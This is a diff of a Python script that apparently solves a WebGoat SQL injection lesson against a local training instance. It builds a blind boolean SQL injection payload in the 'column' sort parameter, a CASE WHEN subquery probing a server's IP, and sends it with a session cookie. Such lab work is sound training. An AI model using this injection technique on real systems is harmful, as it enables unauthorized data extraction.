@@ -8,9 +8,10 @@ WebGoatIP = '127.0.0.1:8080'
 # Type getServers(ip) on Browser console to get the URL to the XHR GET request
 # http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=ip
 URL = 'http://{}/WebGoat/SqlInjectionMitigations/servers?column={}' #FIXME
-JSESSIONID = 'cEIWCjUyeUcjIiAqAII1wzraXfUe3qFMiK_aWzvr' #FIXME
+JSESSIONID = '50x138L73ufvLGgzsj2z3BmRVLmsr7XVfMvsF6eD' #FIXME
 
 regEx = re.compile('\* [0-9]+\-[0-9]+')
+
 
 httpHeaders = {
         'Host': WebGoatIP,
@@ -20,8 +21,8 @@ httpHeaders = {
         'Accept-Language': 'en-US,en;q=0.5',
         'Referer': 'http://{}/WebGoat/start.mvc'.format(WebGoatIP),
         'X-Requested-With': 'XMLHttpRequest',
-        'Cookie': 'JSESSIONID={}'.format(JSESSIONID),
         'Connection': 'keep-alive',
+        'Cookie': f'JSESSIONID={JSESSIONID}',
         }
 
 def success():
@@ -56,8 +57,10 @@ def test():
     #sort by id, hostname, ip
     #sortBy = 'hostname'
     # change webgoat-pre-prod ip with correct and incorrect and see the result
-    sortBy = "(case when (select ip from servers where hostname='webgoat-pre-prod') = '192.168.6.10' then id else hostname end)"
-    # this is true; so sort by id; also we confirmed that servers table exists
+    # see how test() function works
+    pre_prod_ip = '192.168.6.10' # FIXME change it to correct and incorrect
+    sortBy = f"(case when (select ip from servers where hostname='webgoat-pre-prod') = '{pre_prod_ip}' then id else hostname end)"
+	# this is true; so sort by id; also we confirmed that servers table exists
     if getRequest(sortBy, True):
         print('Success!')
     else:
